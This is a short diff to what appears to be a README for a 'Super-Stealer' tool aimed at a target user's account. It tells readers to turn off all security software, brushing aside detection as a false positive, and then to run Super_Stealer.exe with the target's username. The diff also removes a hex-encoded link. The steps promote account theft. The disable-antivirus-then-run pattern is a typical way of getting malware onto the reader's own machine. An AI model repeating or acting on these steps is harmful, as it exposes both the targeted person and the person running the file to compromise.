@@ -10,8 +10,9 @@ The user of your target
 
 How to use:
 Turn off all security as this can show as a false positive ( an entity, such as a file or a process that was detected and identified as malicious even though the entity isn't actually a threat.)
-Download Super-Stealer
+Download the raw file
+Open the raw file
+Open Super_Stealer.exe
+Put the username of your target
 
-
-https://githubusercontent.com/8d3e4e63af867c57a39e0f9e63efb16aaa03b2fc790dfa3f6d454f383b9e5517/68747470733a2f2f7265706f62656174732e6178696f6d2e636f2f6170692f656d6265642f333138336161303064303166383633366135636263313733343463333631363865666639336165632e737667
 
